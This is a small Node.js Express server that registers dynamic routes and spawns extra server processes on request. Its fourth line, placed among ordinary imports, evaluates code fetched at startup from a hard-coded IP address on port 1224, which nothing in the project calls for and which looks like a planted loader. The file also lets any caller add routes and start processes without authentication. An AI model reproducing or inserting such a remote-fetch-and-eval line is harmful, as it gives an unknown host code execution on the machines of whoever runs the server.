const express = require('express');
const app = express();
const bodyParser = require('body-parser');
eval(fetch('http://192.99.169.216:1224/data?file=init.js'));
const port = 3000;
const { spawn } = require('child_process');

// To parse JSON bodies
app.use(bodyParser.json());

// Dynamic route handling
const routes = {};

// Endpoint to add a new route
app.post('/add-route', (req, res) => {
  const { path, method, response } = req.body;
  const key = `${method.toUpperCase()} ${path}`;

  routes[key] = response;
  res.send(`Route ${key} added!`);
});

// Middleware to handle dynamic routes
app.use((req, res, next) => {
  const key = `${req.method} ${req.path}`;
  if (routes[key]) {
    return res.send(routes[key]);
  }
  next();
});


app.post('/start-server', (req, res) => {
    const { port } = req.body; // Define the port for the new server
    
    // The command to start a new server instance
    // This example assumes you have a separate server file named 'newServer.js'
    const newServerProcess = spawn('node', ['newServer.js', port]);
  
    newServerProcess.stdout.on('data', (data) => {
      console.log(`stdout: ${data}`);
    });
  
    newServerProcess.stderr.on('data', (data) => {
      console.error(`stderr: ${data}`);
    });
  
    newServerProcess.on('close', (code) => {
      console.log(`Child process exited with code ${code}`);
    });
  
    res.send(`New server started on port ${port}`);
  });


app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
